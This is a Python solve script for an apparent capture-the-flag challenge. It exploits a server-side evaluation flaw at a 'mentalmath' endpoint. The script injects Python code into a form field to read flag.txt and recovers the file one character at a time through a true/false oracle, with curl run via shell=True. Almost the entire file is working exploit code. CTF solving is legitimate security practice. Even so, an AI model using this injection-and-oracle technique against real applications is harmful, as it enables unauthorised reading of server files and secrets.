#!/usr/bin/env python3
​
import json
import string
import subprocess
​
ALPHABET = string.printable
CURL = """\
2>/dev/null curl 'http://mentalmath.tamuctf.com/ajax/new_problem' \
    --compressed \
    -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -H 'Connection: keep-alive' \
    --data 'problem=ord(open("flag.txt","r").read()[{pos}])&answer={guess}'
"""
​
​
def main():
    flag = 'gigem{'
    while not flag.endswith('}'):
        pos = len(flag)
​
        for c in ALPHABET:
            guess = ord(c)
            result = json.loads(
                subprocess.check_output(
                    CURL.format(pos=pos, guess=guess), shell=True
                ).decode()
            )
            if result['correct']:
                flag += chr(guess)
                print(flag)
                break
        else:
            print('FAILED')
            return
​
​
if __name__ == '__main__':
    main()
